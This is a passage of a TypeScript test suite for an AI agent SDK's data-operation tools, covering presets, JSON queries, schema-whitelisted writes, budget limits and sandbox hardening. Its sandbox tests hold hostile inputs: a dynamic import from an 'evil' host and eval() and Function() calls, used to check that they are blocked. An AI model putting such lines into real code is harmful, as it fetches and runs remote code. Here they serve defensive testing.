import { z } from 'zod'
import { createDataOps } from '../../tools/dataOps'
import { createBudgetMiddleware } from '../../harness/budget'
import { resolveContextOptions, PRESET_PRESERVE } from '../../sdk/contextPreset'
import { jpEval, searchJson } from '../../tools/dataSlotQuery'
import { computeMaxIterations } from '../../harness/createAgent';
import { mergeSummarySegments, parseSummarySegment, renderSummarySegment } from '../../utils/rounds';
import { composeMiddlewareStack } from '../../sdk/middlewareStack'
import { AIMessage } from '@langchain/core/messages';

import type { TestCtx } from './_ctx'

// 压缩预设档位 resolveContextOptions
export async function run(ctx: TestCtx): Promise<void> {
  const { assert, invoke, byName } = ctx
  console.log('\n[context preset]')
  {
    // auto 默认:LLM 摘要开、召回 3、阈值 0.5、窗口 0.4
    const auto = resolveContextOptions({}, 1_048_576)
    assert(auto.enableLLMSummary === true, 'preset auto: enableLLMSummary 默认 true')
    assert(auto.recallTopK === 3, 'preset auto: recallTopK=3')
    assert(auto.summaryThresholdRatio === 0.5, 'preset auto: threshold=0.5')
    assert(auto.windowRatio === 0.4, 'preset auto: window=0.4')
    assert(auto.contextWindow === 1_048_576, 'preset auto: contextWindow 回退模型表值')

    // conservative:更晚触发、保留更多、召回 2、关 LLM 摘要(省成本)
    const cons = resolveContextOptions({ contextPreset: 'conservative' }, 131072)
    assert(cons.enableLLMSummary === false, 'preset conservative: enableLLMSummary=false(零成本索引摘要)')
    assert(cons.summaryThresholdRatio === 0.7, 'preset conservative: threshold=0.7')
    assert(cons.windowRatio === 0.5, 'preset conservative: window=0.5')
    assert(cons.recallTopK === 2, 'preset conservative: recallTopK=2')

    // aggressive:更早触发、保留少、召回 5、LLM 摘要开
    const agg = resolveContextOptions({ contextPreset: 'aggressive' }, 32768)
    assert(agg.summaryThresholdRatio === 0.3, 'preset aggressive: threshold=0.3')
    assert(agg.windowRatio === 0.3, 'preset aggressive: window=0.3')
    assert(agg.recallTopK === 5, 'preset aggressive: recallTopK=5')
    assert(agg.enableLLMSummary === true, 'preset aggressive: enableLLMSummary=true')

    // complex:多步复杂任务/大 JSON/长流程 → 最大窗口 + 最晚触发 + 最多召回 + LLM 摘要(add-complex-preset-and-vfs-json)
    const cmp = resolveContextOptions({ contextPreset: 'complex' }, 131072)
    assert(cmp.summaryThresholdRatio === 0.7, 'preset complex: threshold=0.7(最晚触发)')
    assert(cmp.windowRatio === 0.6, 'preset complex: window=0.6(最大保留窗口)')
    assert(cmp.recallTopK === 5, 'preset complex: recallTopK=5(最多召回)')
    assert(cmp.enableLLMSummary === true, 'preset complex: enableLLMSummary=true')
    // PRESET_PRESERVE:complex 扩 query/search(跨轮保留更多工具结果);其余预设保持少(4.9 起 describe_data → schema_data)
    assert(PRESET_PRESERVE.complex.length === 4 && PRESET_PRESERVE.complex.includes('query_data') && PRESET_PRESERVE.complex.includes('search_data'), 'PRESET_PRESERVE: complex 含 schema_data/read/query_data/search_data')
    assert(PRESET_PRESERVE.auto.includes('read') && !PRESET_PRESERVE.auto.includes('query_data'), 'PRESET_PRESERVE: auto 仅 schema_data/read(不含 query/search)')
    assert(PRESET_PRESERVE.conservative.length === 1, 'PRESET_PRESERVE: conservative 仅 schema_data(最省)')

    // 细参覆盖 preset:aggressive 但单独把召回调到 8
    const override = resolveContextOptions({ contextPreset: 'aggressive', contextOptions: { recallTopK: 8 } }, 32768)
    assert(override.recallTopK === 8, 'preset 覆盖:contextOptions.recallTopK 覆盖 preset')
    assert(override.summaryThresholdRatio === 0.3, 'preset 覆盖:未覆盖字段仍用 preset(aggressive 0.3)')

    // 细参覆盖 enableLLMSummary:conservative 关 LLM,但用户强制开
    const forceLlm = resolveContextOptions({ contextPreset: 'conservative', contextOptions: { enableLLMSummary: true } }, 131072)
    assert(forceLlm.enableLLMSummary === true, 'preset 覆盖:contextOptions.enableLLMSummary 强制覆盖 preset(false)')

    // contextWindow 显式 0:关闭 token 模式回退轮数(保留用户显式值)
    const zeroWin = resolveContextOptions({ contextOptions: { contextWindow: 0 } }, 1_048_576)
    assert(zeroWin.contextWindow === 0, 'preset:contextOptions.contextWindow=0 保留(回退轮数模式)')

    // contextOptions:false 视为空,用 preset 默认
    const falseOpts = resolveContextOptions({ contextOptions: false }, 131072)
    assert(falseOpts.enableLLMSummary === true && falseOpts.recallTopK === 3, 'contextOptions:false → 用 auto preset 默认')
  }

  // computeMaxIterations(循环总迭代硬上限 max(maxToolRounds*3,30),防自纠死循环;harden-react-loop-budget)
  assert(computeMaxIterations(10) === 30, 'computeMaxIterations: 默认 max(10*3, 30) = 30')
  assert(computeMaxIterations(3) === 30, 'computeMaxIterations: 小 maxToolRounds(3) 取下限 30')
  assert(computeMaxIterations(20) === 60, 'computeMaxIterations: 大 maxToolRounds(20) → 60')
  assert(computeMaxIterations(10, 50) === 50, 'computeMaxIterations: 显式 userMax(50) 覆盖')

  // mergeSummarySegments/parse/render(统一摘要合并协议,unify-context-compression)
  assert(mergeSummarySegments({ body: '新' }).body === '新', 'mergeSummarySegments: 无 prev → current 原样')
  const merged = mergeSummarySegments({ body: '新', rounds: 3 }, { body: '旧', rounds: 5 })
  assert(merged.body === '旧\n【续】\n新' && merged.rounds === 8 && merged.cumulative === true, 'mergeSummarySegments: 有 prev → prev 在前 + 【续】 + current,rounds 叠加,cumulative=true')
  const seg = { body: 'x', rounds: 2 }
  assert(parseSummarySegment(renderSummarySegment(seg))?.body === 'x', 'parse/render 往返:body 不变')
  assert(parseSummarySegment('非摘要内容') === null, 'parseSummarySegment: 非摘要段 → null')

  // composeMiddlewareStack(中间件声明式排序,declarative-middleware-ordering;sdk-events 靠 Infinity + 原序最末)
  // 输入模拟 createChatSdk 实际构造序:用户中间件在前(行 895 options.middleware),sdk-events 在后(行 898)
  const stack = composeMiddlewareStack([
    { name: 'customUser' }, { name: 'usageHints' }, { name: 'dataHint' }, { name: 'sdk-events' },
  ] as any[])
  const ordered = stack.map((m: any) => m.name)
  assert(ordered[0] === 'dataHint', 'composeMiddlewareStack: dataHint(priority 10)排最前')
  assert(ordered[1] === 'usageHints', 'composeMiddlewareStack: usageHints(priority 20)次之')
  assert(ordered[2] === 'customUser' && ordered[3] === 'sdk-events', 'composeMiddlewareStack: 用户中间件 + sdk-events 同 Infinity 按原序,sdk-events 最末(锁死 9999 bug 不回归)')

  // ============ 大 JSON 查询/搜索(query_data / search_data)============
  console.log('\n[data query + search]')
  {
    const data = {
      components: [
        { type: 'card', title: '商品卡片A', price: 50, stock: 3 },
        { type: 'list', title: '列表B', price: 200, stock: 0 },
        { type: 'card', title: '商品卡片C', price: 80, stock: 5 },
      ],
      meta: { total: 3, owner: { name: '张三', city: '北京' } },
    }
    const tools = createDataOps({ schema: z.any(), bind: data, description: '页面' })
    const t = byName(tools)

    // jpEval 纯函数:过滤数组
    let nodes = jpEval(data, '$.components[?(@.type=="card" && @.price<100)]')
    assert(nodes.length === 2 && nodes[0].index === 0 && nodes[1].index === 2, 'jpEval: 过滤 card 且 price<100 → 命中 index 0/2')

    // 递归找后代
    nodes = jpEval(data, '$..title')
    assert(nodes.length === 3 && nodes.some((n) => n.value === '商品卡片C'), 'jpEval: $..title 递归找全部 title')

    // 点号路径 + 索引
    nodes = jpEval(data, '$.components.1.title')
    assert(nodes.length === 1 && nodes[0].value === '列表B', 'jpEval: $.components.1.title 精确定位')

    // 通配
    nodes = jpEval(data, '$.components[*].type')
    assert(nodes.length === 3, 'jpEval: $.components[*].type 通配展开')

    // 工具包装:query_data(无 path,直接对主数据)
    let r = await invoke(t['query_data'], { expr: '$.components[?(@.stock==0)]' })
    let parsed = JSON.parse(r)
    assert(parsed.matched === 1 && parsed.results[0].index === 1, 'query_data: stock==0 → 命中 index 1')

    // 工具包装:语法错误返回错误信息(不抛)
    r = await invoke(t['query_data'], { expr: '$[?(@.x==' })
    assert(/JSONPath/.test(r), 'query_data: 语法错误返回错误信息')

    // ---- W1 批量 queries(tool-surface-economy):batch 信封 + 逐条与单次输出同构;单条失败不整批;与 expr 互斥 ----
    r = await invoke(t['query_data'], { queries: ['$.components[?(@.stock==0)]', '$..title'] })
    parsed = JSON.parse(r)
    assert(parsed.batch === true && parsed.results.length === 2, '✓ query 批量 → batch 信封 + 逐条结果数组')
    assert(parsed.results[0].ok === true && parsed.results[0].matched === 1 && parsed.results[0].results[0].index === 1, '✓ query 批量 → 首条与单次输出同构(matched/results[].path/index)')
    assert(parsed.results[1].ok === true && parsed.results[1].matched === 3, '✓ query 批量 → 次条递归表达式独立求值')

    // 单条语法错 → 该项 ok:false 带 error,不整批失败
    r = await invoke(t['query_data'], { queries: ['$.components[?(@.stock==0)]', '$[?(@.x=='] })
    parsed = JSON.parse(r)
    assert(parsed.batch === true && parsed.results[0].ok === true && parsed.results[1].ok === false && /JSONPath/.test(parsed.results[1].error), '✓ query 批量 → 单条失败该项标 error 不整批(容错口径同 read jsonPaths)')

    // 与 expr 同传按 queries(expr 被忽略,不因 expr 非法报错)
    r = await invoke(t['query_data'], { queries: ['$.meta.total', '$.meta.owner.name'], expr: '$.nope' })
    parsed = JSON.parse(r)
    assert(parsed.batch === true && parsed.results.every((x: any) => x.ok === true), '✓ query 批量 → 与 expr 同传按 queries')

    // 两者都缺 → 参数错误(不裸抛)
    r = await invoke(t['query_data'], {})
    assert(/^ERROR:/.test(r) && /queries/.test(r), '✓ query → expr/queries 都缺返回参数错误(引导二选一)')

    // 单元素 queries(<2)被 schema 拒(单表达式应走 expr;zod 前置校验经 LC invoke 抛错或结构化错误)
    let single = ''
    try { single = await invoke(t['query_data'], { queries: ['$.meta.total'] }) } catch (e) { single = `THREW ${String(e)}` }
    assert(/^THREW/.test(single) || /ERROR:/.test(single), '✓ query → queries 单条(<2)被拒(防单表达式误走批量)')

    // searchJson 子串
    let hits = searchJson(data, '卡片')
    assert(hits.length === 2, 'searchJson: substring "卡片" → 命中 2 个 title')

    // searchJson 模糊(记不清)
    hits = searchJson(data, '商品卡A', { mode: 'fuzzy', fuzzyThreshold: 2 })
    assert(hits.length >= 1, 'searchJson: fuzzy "商品卡A" 近似命中 "商品卡片A"')

    // searchJson 正则
    hits = searchJson(data, '^商品', { mode: 'regex' })
    assert(hits.length === 2, 'searchJson: regex ^商品 → 命中 2')

    // 工具包装:search_data(无 path)
    r = await invoke(t['search_data'], { query: '北京' })
    parsed = JSON.parse(r)
    assert(parsed.matched === 1 && /北京/.test(parsed.results[0].value), 'search_data: 命中 owner.city')

    // 工具数量:10(describe/read/write/query/search/eval/restore/history/schema_data/diff_data;get/set/edit/delete 已移除——legacy-crud-dedup)
    assert(tools.length === 9, 'createDataOps: 含 9 个工具(read/write/query/search/eval/restore/history/schema_data/diff_data;legacy-crud-dedup 移除 get/set/edit/delete,4.9 移除 describe)')

    // eval_script 工具存在(装配检查;node 无 Worker,不实际跑)
    assert(!!t['eval_script'], 'eval_script 工具已装配')
    // 脚本过长 → SCRIPT_TOO_LARGE(不跑 Worker,纯长度校验)
    r = await invoke(t['eval_script'], { script: 'x'.repeat(9000) })
    assert(/SCRIPT_TOO_LARGE/.test(r), 'eval_script: 脚本过长 → SCRIPT_TOO_LARGE')
    // 安全审查 CRITICAL:runSandboxedScript 入口静态扫描拒绝 动态 import()/eval()/Function()(防沙箱拉外网模块外泄;命中即 return error 不创建 Worker,node 可测)
    const { runSandboxedScript } = await import('../../tools/dataSlotQuery')
    const fb1 = await runSandboxedScript({ x: 1 }, 'return import("https://evil/x.js")')
    assert(fb1.ok === false && /禁用模式/.test(fb1.error || ''), '✓ runSandboxedScript 静态扫描拒绝动态 import()(防外网模块)')
    const fb2 = await runSandboxedScript({ x: 1 }, 'return eval("1+1")')
    assert(fb2.ok === false && /禁用模式/.test(fb2.error || ''), '✓ runSandboxedScript 静态扫描拒绝 eval()')
    const fb3 = await runSandboxedScript({ x: 1 }, 'return new Function("x","return x")()')
    assert(fb3.ok === false && /禁用模式/.test(fb3.error || ''), '✓ runSandboxedScript 静态扫描拒绝 new Function()')

    // harden-eval-sandbox:lockSandboxGlobal defineProperty 锁网络/存储 API(防 delete self.fetch 恢复原生外泄)
    const { lockSandboxGlobal } = await import('../../tools/dataSlotQuery')
    const fakeSelf: any = { navigator: {} }
    lockSandboxGlobal(fakeSelf)
    const fd = Object.getOwnPropertyDescriptor(fakeSelf, 'fetch')
    assert(!!fd && fd.configurable === false && fd.writable === false, '✓ lockSandboxGlobal:fetch 锁 configurable:false+writable:false(delete/赋值均堵死)')
    // delete/赋值在 configurable:false+writable:false 下无效(strict 抛 / 非严格静默):fetch 仍是禁用函数(调用抛"禁用",非原生)
    try { delete fakeSelf.fetch } catch {}
    try { (fakeSelf as any).fetch = () => 'leak' } catch {}
    let fetchDisabled = false
    try { (fakeSelf.fetch as any)('http://x') } catch (e: any) { fetchDisabled = /禁用/.test(String((e && e.message) || e)) }
    assert(fetchDisabled, '✓ lockSandboxGlobal:delete/赋值 self.fetch 均无效 → 调用仍抛"禁用"(原生 fetch 不可达,逃逸外泄堵死)')
    const sd = Object.getOwnPropertyDescriptor(fakeSelf.navigator, 'sendBeacon')
    assert(!!sd && sd.configurable === false, '✓ lockSandboxGlobal:navigator.sendBeacon 锁')
    const idd = Object.getOwnPropertyDescriptor(fakeSelf, 'indexedDB')
    assert(!!idd && idd.configurable === false && idd.value === undefined, '✓ lockSandboxGlobal:indexedDB 锁为 undefined 不可恢复')

    // skill-external-scripts §1:createSandboxRunner 柯里化沙箱(从 sandbox.ts 抽出,runSandboxedScript 薄包装它)
    const { createSandboxRunner } = await import('../../tools/sandbox')
    const runner = createSandboxRunner('return import("https://evil/x.js")')
    assert(typeof runner === 'function', '✓ createSandboxRunner:柯里化返回执行器(script+timeout 绑定,待 input)')
    const cfb = await runner(undefined)
    assert(cfb.ok === false && /禁用模式/.test(cfb.error || ''), '✓ createSandboxRunner:无参执行静态扫描拒绝(skill exec 路径与 runSandboxedScript 等价)')
    const reExport = await import('../../tools/dataSlotQuery')
    assert(typeof reExport.runSandboxedScript === 'function' && typeof reExport.lockSandboxGlobal === 'function', '✓ 沙箱迁移:dataSlotQuery re-export runSandboxedScript + lockSandboxGlobal 不断(外部 import 零破坏)')
  }

  // ============ budget middleware 运行时(automation §1 资源预算闸;maintain 测试盲区 HIGH 补)============
  console.log('\n[budget middleware · 资源预算闸]')
  {
    const usage: any = { prompt_tokens: 0, completion_tokens: 0, total_tokens: 0 }
    const events: any[] = []
    const emit = (e: any) => events.push(e)
    const mkNext = (content = 'ok') => async () => ({ message: new AIMessage(content), content, toolCalls: [] as any, aborted: false })
    // 未超限 → 放行 next
    const mw = createBudgetMiddleware(usage, { tokenBudget: 100, timeBudgetMs: 5000 }, emit)
    mw.beforeAgent!({} as any)
    usage.total_tokens = 50
    const r1 = await mw.wrapModelCall!({ messages: [], state: {} as any } as any, mkNext() as any)
    assert(r1.content === 'ok' && !r1.aborted, '✓ budget 未超限 → 放行 next(正常响应)')
    // token 超限 → aborted + emit BUDGET_EXCEEDED(不调 next)
    usage.total_tokens = 200
    events.length = 0
    const r2 = await mw.wrapModelCall!({ messages: [], state: {} as any } as any, mkNext('不应到达') as any)
    assert(r2.aborted === true, '✓ budget token 超限(200>100) → aborted response(不调 next)')
    assert(events.some((e) => e.code === 'BUDGET_EXCEEDED'), '✓ budget 超限 → emit BUDGET_EXCEEDED(observable)')
    // time 超限 → aborted
    const mwT = createBudgetMiddleware({ total_tokens: 0 } as any, { timeBudgetMs: 50 }, emit)
    mwT.beforeAgent!({} as any)
    await new Promise((r) => setTimeout(r, 80))
    const r3 = await mwT.wrapModelCall!({ messages: [], state: {} as any } as any, mkNext('不应到达') as any)
    assert(r3.aborted === true, '✓ budget time 超限(80ms>50ms) → aborted')
  }

  // ============ read/write 高层工具(单主对象 + 自动锁)============
  console.log('\n[read/write 高层工具]')
  {
    const pageObj: any = { title: '原标题', items: ['a', 'b'] }
    const tools = createDataOps(
      { schema: z.object({ title: z.string(), items: z.array(z.string()) }), bind: pageObj, description: '页面数据' },
      { conflictWatchFields: ['*'] },
    )
    const t = byName(tools)

    // read() 无 jsonPath → 返回说明 + 格式提示
    let r = await invoke(t['read'], {})
    assert(/页面数据/.test(r), 'read() 无 jsonPath → 返回主数据说明')

    // read({jsonPath}) → 返回当前值 + hash
    r = await invoke(t['read'], { jsonPath: 'title' })
    assert(/原标题/.test(r) && /hash=/.test(r), 'read({jsonPath}) → 返回当前值 + hash')

    // write 整体 set(value 直传 JSON 对象)
    r = await invoke(t['write'], { value: { title: '新标题', items: ['x'] } })
    assert(/已 write\(set\)/.test(r) && /新标题/.test(r), 'write 整体 set(直传 object)→ 写入成功')
    assert(pageObj.title === '新标题', 'write set → 实际写入 bind')

    // write 增量 patch(merge)
    r = await invoke(t['write'], { value: { title: '合并标题' }, patch: { op: 'merge' } })
    assert(/已 write\(edit\)/.test(r) && pageObj.title === '合并标题', 'write patch merge → 增量合并')

    // write 增量 patch(append)
    r = await invoke(t['write'], { value: 'c', patch: { op: 'append', jsonPath: 'items' } })
    assert(pageObj.items.length === 2, 'write patch append → 数组追加')

    // write 非法值 → schema 校验失败不写入
    r = await invoke(t['write'], { value: { title: 123, items: [] } })
    assert(/校验失败|invalid|SCHEMA_INVALID/.test(r), 'write 非法值(title 非字符串)→ schema 校验失败')

    // write del:true → 删除子路径
    r = await invoke(t['write'], { patch: { op: 'remove', jsonPath: 'items' }, del: true })
    assert(/已删除/.test(r), 'write del:true → 删除子路径')

    // 自动乐观锁:read 后外部改值,write 触发 VERSION_CONFLICT
    const page3: any = { v: 1 }
    const tools3 = createDataOps({ schema: z.object({ v: z.number() }), bind: page3, description: 'p3' }, { conflictWatchFields: ['*'] })
    const t3 = byName(tools3)
    await invoke(t3['read'], { jsonPath: 'v' })  // 记录 hash
    page3.v = 999    // 外部改值(hash 变)
    r = await invoke(t3['write'], { value: { v: 2 } })
    assert(/VERSION_CONFLICT/.test(r), 'write autoLock:read 后外部改值 → 自动乐观锁触发冲突')

    // LEAF_BIND:叶子 bind 的 write(set) 拒绝(不静默丢失;set_data 已移除,原双断言合一)
    const leaf = '原始字符串' as any
    const leafTools = createDataOps({ schema: z.string(), bind: leaf, description: 'leaf' })
    const lt = byName(leafTools)
    r = await invoke(lt['write'], { value: '"新值"' })
    assert(/LEAF_BIND/.test(r), 'write(set) 叶子 bind → LEAF_BIND 拒绝')

    // 治本(write value 双语义,#76):patch 自带 value(与 patches 元素一致),消除顶层 value 双语义歧义;双支持(向后兼容)
    const pagePV: any = { title: 'old', items: [] as string[] }
    const toolsPV = createDataOps(
      { schema: z.object({ title: z.string(), items: z.array(z.string()) }), bind: pagePV, description: 'p-pv' },
    )
    const tPV = byName(toolsPV)
    r = await invoke(tPV['write'], { patch: { op: 'set', jsonPath: 'title', value: 'patch自带值' } })
    assert(pagePV.title === 'patch自带值', '治本: write patch 自带 value → patch.value 落地(消除顶层 value 双语义歧义)')
    r = await invoke(tPV['write'], { value: '兼容旧用法', patch: { op: 'set', jsonPath: 'title' } })
    assert(pagePV.title === '兼容旧用法', '治本: write 双支持 → 顶层 value(无 patch.value)向后兼容')
    r = await invoke(tPV['write'], { value: '顶层', patch: { op: 'set', jsonPath: 'title', value: 'patch优先' } })
    assert(pagePV.title === 'patch优先', '治本: patch.value 与顶层 value 都传时 → patch.value 优先')

    // 空字符串 value 合法(editor 实测修:'' 曾误判 MISSING_VALUE 且 hint 误导用 remove —— remove 是删键,「置空」≠「删键」)
    // (须在下方 del 用例前跑:del 删 items 后 bind 不再满足 schema,后续整对象校验会挂)
    r = await invoke(tPV['write'], { patch: { op: 'set', jsonPath: 'title', value: '' } })
    assert(pagePV.title === '', "M1: write set value:'' → 空字符串合法落地(原误判 MISSING_VALUE)")
    // move 的 value 是目标路径,空串仍拒(防空目标路径滑过白名单)
    r = await invoke(tPV['write'], { patches: [{ op: 'move', jsonPath: 'items.0', value: '' }] })
    assert(/MISSING_VALUE/.test(r), "M1 边界: write move value:''(目标路径空)→ 仍拒 MISSING_VALUE")

    // M1: write del 模式可不传 op(原 bug:patch.op 必填 + description 删除示例不带 op → LLM 照描述写 SCHEMA_INVALID 浪费一轮重试)
    r = await invoke(tPV['write'], { patch: { jsonPath: 'items' }, del: true })
    assert(/已删除/.test(r), 'M1: write del 不传 op → 通过(del 分支不读 op;原 bug:op 必填致 zod 校验失败)')

    // 白名单严格(fix-dataops-write-correctness):write(set) 的未声明字段一律丢弃,
    // 即便用户显式传入也不写回 bind(安全收紧:可写字段须在 schema 声明)。
    const pageSupp2: any = { title: 'old', _internal: 'keep' }
    const toolsSupp2 = createDataOps({ schema: z.object({ title: z.string() }), bind: pageSupp2, description: 'p-supp2' })
    const tSupp2 = byName(toolsSupp2)
    r = await invoke(tSupp2['write'], { value: { title: 'new2', _internal: 'user-supplied' } })
    assert(pageSupp2.title === 'new2' && pageSupp2._internal === 'keep', '白名单严格: write(set) 显式传非声明字段 → 被挡(_internal 保持 keep 而非 user-supplied)')

    // 字符串 value parse 一致性(统一启发式)
    const page8: any = { count: 0, list: [] as any[] }
    const tools8 = createDataOps({ schema: z.object({ count: z.number(), list: z.array(z.any()) }), bind: page8, description: 'p8' })
    const t8 = byName(tools8)
    r = await invoke(t8['write'], { patch: { op: 'set', jsonPath: 'count', value: '5' } })
    assert(page8.count === 5, 'write(edit) 裸数字字符串 "5" → parse 成数字 5')
    r = await invoke(t8['write'], { patch: { op: 'append', jsonPath: 'list', value: 'c' } })
    assert(page8.list[0] === 'c', 'write(edit) 裸字符串 "c" → 当原值字符串(parse 失败 fallback)')
    r = await invoke(t8['write'], { value: '{bad' })
    assert(/JSON_PARSE/.test(r), 'write(set) "{bad" → JSON_PARSE(以 { 开头按 JSON 解析失败报错)')

    // #优化1:write 批量 patches(一次原子应用多个 patch)
    const page9: any = { title: 't', a: 1, b: 2, items: ['x'] }
    const tools9 = createDataOps({ schema: z.object({ title: z.string(), a: z.number(), b: z.number(), items: z.array(z.string()) }), bind: page9, description: 'p9' })
    const t9 = byName(tools9)
    r = await invoke(t9['write'], { patches: [
      { op: 'set', jsonPath: 'title', value: '新标题' },
      { op: 'set', jsonPath: 'a', value: 10 },
      { op: 'append', jsonPath: 'items', value: 'y' },
    ] })
    assert(page9.title === '新标题' && page9.a === 10 && page9.items.length === 2 && page9.items[1] === 'y', 'write 批量 patches → 一次原子应用多个 patch 全部生效')
    // 批量中任一 patch 非法 → 整体不写入(回滚)
    const beforeA = page9.a
    r = await invoke(t9['write'], { patches: [
      { op: 'set', jsonPath: 'a', value: 99 },
      { op: 'set', jsonPath: 'b', value: '非数字' },  // schema 拒绝(b 应为 number)
    ] })
    assert(/SCHEMA_INVALID|校验失败/.test(r) && page9.a === beforeA, 'write 批量 patches 任一非法 → 整体不写入(原子回滚)')

    // #优化2:read 字段裁剪 + 深度截断
    const page10: any = { title: 'T', meta: { author: 'me', ts: 123, deep: { x: 1 } }, list: [{ id: 1, name: 'a', extra: 'x' }, { id: 2, name: 'b', extra: 'y' }] }
    const tools10 = createDataOps({ schema: z.any(), bind: page10, description: 'p10' })
    const t10 = byName(tools10)
    r = await invoke(t10['read'], { jsonPath: 'list', fields: ['id', 'name'] })
    assert(/"id":1/.test(r) && /"name":"a"/.test(r) && !/extra/.test(r), 'read fields 裁剪 → 只返回指定字段(extra 不出现)')
    r = await invoke(t10['read'], { jsonPath: 'meta', depth: 1 })
    assert(/"author":"me"/.test(r) && /\{\.\.\.\}/.test(r) && !/"x":1/.test(r), 'read depth=1 → 第 2 层用 {...} 占位(deep.x 截断)')
    r = await invoke(t10['read'], { jsonPath: 'list', fields: ['id'], depth: 2 })
    assert(/"id":1/.test(r) && !/name/.test(r), 'read fields + depth 组合 → 先裁字段再截深度(id 保留,extra/name 裁掉)')

    // #优化3:eval_script transform 增量 patches(返回 {patches:[...]} 而非完整新值)
    // 注:沙箱 Worker 在 Node.js 不可用,此处仅校验 transform patches 的入参解析逻辑(脚本不实际执行,用 mock 替换 runSandboxedScript 不可行,改为验证描述/schema 含 patches 提示)
    const evalDesc = (t10['eval_script'] as any).description || ''
    assert(/patches/.test(evalDesc), 'eval_script 描述含 patches 增量模式说明')

    // #白名单:schema 形状自动限制可见性 + 可写性(ZodObject 子集 + 完整大 JSON bind)
    const bigJson: any = { title: '公开标题', components: [{ id: 1 }], secret: '机密字段', internalState: { flag: true } }
    const wlTools = createDataOps({
      schema: z.object({  // schema 只声明 title + components,隐藏 secret + internalState
        title: z.string(),
        components: z.array(z.object({ id: z.number() })),
      }),
      bind: bigJson,
      description: '白名单示例',
    })
    const wlt = byName(wlTools)
    // read 整体 → 只返回 schema 声明字段(secret/internalState 隐藏)
    r = await invoke(wlt['read'], {})
    assert(/公开标题/.test(r) && /components/.test(r) && !/机密字段/.test(r) && !/internalState/.test(r), '白名单 read 整体 → 隐藏未声明字段(secret/internalState 不暴露)')
    // read 非声明字段 → PATH_DENIED
    r = await invoke(wlt['read'], { jsonPath: 'secret' })
    assert(/PATH_DENIED/.test(r), '白名单 read 非声明字段 → PATH_DENIED')
    // edit 非声明字段 → PATH_DENIED
    r = await invoke(wlt['write'], { patch: { op: 'set', jsonPath: 'secret', value: '"泄露"' } })
    assert(/PATH_DENIED/.test(r) && bigJson.secret === '机密字段', '白名单 write(edit) 非声明字段 → PATH_DENIED(不写入)')
    // delete 非声明字段 → PATH_DENIED
    r = await invoke(wlt['write'], { patch: { jsonPath: 'secret' }, del: true })
    assert(/PATH_DENIED/.test(r) && bigJson.secret === '机密字段', '白名单 write(del) 非声明字段 → PATH_DENIED(不删除)')
    // write(set) 整体 → merge 语义(只更新声明字段,隐藏字段保留不动,防误删)
    r = await invoke(wlt['write'], { value: { title: '新标题', components: [{ id: 2 }] } })
    assert(bigJson.title === '新标题' && bigJson.secret === '机密字段' && bigJson.internalState.flag === true, '白名单 write(set) → merge 语义:更新声明字段,隐藏字段(secret/internalState)保留不动')
    // write(set) 整体 → 同样 merge 语义
    r = await invoke(wlt['write'], { value: { title: '又改', components: [] } })
    assert(bigJson.title === '又改' && bigJson.secret === '机密字段', '白名单 write(set) → merge 语义:隐藏字段保留')
    // query_data → 只查白名单字段(隐藏字段不参与查询)
    r = await invoke(wlt['query_data'], { expr: '$..*' })
    assert(!/机密字段/.test(r) && !/internalState/.test(r), '白名单 query_data → 只查声明字段(隐藏字段不参与)')
    // edit 声明字段子路径 → 允许
    r = await invoke(wlt['write'], { patch: { op: 'set', jsonPath: 'title', value: '"允许改"' } })
    assert(bigJson.title === '允许改', '白名单 write(edit) 声明字段子路径 → 允许写入')

    // 数组子项删除 splice(fix-dataops-write-correctness):三入口删数组元素 → length 递减、元素前移、无稀疏空位
    const arrSchema = z.object({ components: z.array(z.object({ id: z.number() })) })
    const mkArr = () => ({ components: [{ id: 1 }, { id: 2 }, { id: 3 }] })
    // write del(不传 op,等价旧 delete_data)
    const ap1 = mkArr()
    await invoke(byName(createDataOps({ schema: arrSchema, bind: ap1, description: 'ap1' }))['write'], { patch: { jsonPath: 'components.0' }, del: true })
    assert(ap1.components.length === 2 && ap1.components[0].id === 2 && ap1.components[1].id === 3, '数组删除 splice: write del components.0 → length 3→2、元素前移([1,2,3]→[2,3]),无 empty 槽')
    // write del
    const ap2 = mkArr()
    await invoke(byName(createDataOps({ schema: arrSchema, bind: ap2, description: 'ap2' }))['write'], { patch: { op: 'remove', jsonPath: 'components.0' }, del: true })
    assert(ap2.components.length === 2 && ap2.components[0].id === 2, '数组删除 splice: write del components.0 → length 3→2、元素前移')
    // write(edit) remove
    const ap3 = mkArr()
    await invoke(byName(createDataOps({ schema: arrSchema, bind: ap3, description: 'ap3' }))['write'], { patch: { op: 'remove', jsonPath: 'components.0' } })
    assert(ap3.components.length === 2 && ap3.components[0].id === 2, '数组删除 splice: write(edit) remove components.0 → length 3→2、元素前移')
    // 连续删空到 0 个元素(length 一路递减,不留空位;schema 无 .min() 约束允许删空)
    const ap4 = mkArr()
    const at4 = byName(createDataOps({ schema: arrSchema, bind: ap4, description: 'ap4' }))
    await invoke(at4['write'], { patch: { jsonPath: 'components.0' }, del: true })
    await invoke(at4['write'], { patch: { jsonPath: 'components.0' }, del: true })
    await invoke(at4['write'], { patch: { jsonPath: 'components.0' }, del: true })
    assert(ap4.components.length === 0, '数组连续删除: 3→2→1→0,length 一路递减无残留空位')
  }

  // ===== CA 并发修复:per-call scope token(RunnableConfig.configurable.__pgDataScope)=====
  {
    // 场景:ambient scope A 有过期基线(autoLock 会冲突);带 config scope B 的调用不受 A 污染(token 优先)
    const pageC: any = { count: 1 }
    const toolsC = createDataOps({ schema: z.object({ count: z.number() }), bind: pageC, description: 'c' }, { conflictWatchFields: ['*'] })
    const tC = byName(toolsC)
    const ctl = (toolsC as any).controller
    // ① ambient 切到 scope-A 并 read 建基线
    const exitA = ctl.enterScope('scope-A')
    await invoke(tC['read'], {})
    // ② 外部改 bind(基线过期;无 token 时 autoLock 必冲突挂起)
    pageC.count = 99
    // ③ 带 per-call token scope-B 的 write(set):读 B 基线(空 → 无 effHash → 直接写),不冲突
    const r3 = await tC['write'].invoke({ value: '{ "count": 5 }' }, { configurable: { __pgDataScope: 'scope-B' } })
    assert(!/CONFLICT/.test(r3) && pageC.count === 5, '✓ per-call scope token 优先:带 __pgDataScope 的写用 B 基线,不被 ambient scope-A 过期基线污染')
    // ④ 对照:不带 token 的 write 走 ambient scope-A 过期基线 → autoLock 冲突挂起(证明 ③ 确实走了 token 而非巧合)
    pageC.count = 77  // 再制造一次外部改动
    await invoke(tC['read'], {})  // 刷新 scope-A 基线(=77 的 hash)
    pageC.count = 88  // 基线再次过期
    const r4 = await invoke(tC['write'], { value: '{ "count": 6 }' })
